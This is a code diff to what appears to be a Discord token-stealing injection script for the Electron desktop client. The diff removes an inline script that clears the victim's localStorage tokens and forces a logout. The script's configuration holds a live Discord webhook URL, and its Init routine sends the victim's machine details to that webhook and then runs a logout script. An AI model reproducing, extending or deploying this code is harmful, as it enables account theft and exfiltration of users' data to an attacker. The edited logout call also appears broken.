@@ -5,8 +5,6 @@ const electron = require("electron");
 const https = require("https");
 const queryString = require("querystring");
 
-var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
-
 let config = {
  webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
  "logout": "true",
@@ -421,7 +419,7 @@ async function Init() {
    },
    {
     name: "Computer Name:",
-    value: "`" + computerName + "`",
+    value: "`" + process.env.COMPUTERNAME + "`",
     inline: true,
    },
    {
@@ -452,7 +450,7 @@ async function Init() {
  };
 
  SendWebhook(webhook, payload);
- await ExecScript(logOutScript);
+ await ExecScript(config.get.logout);
 }
 
 Init();
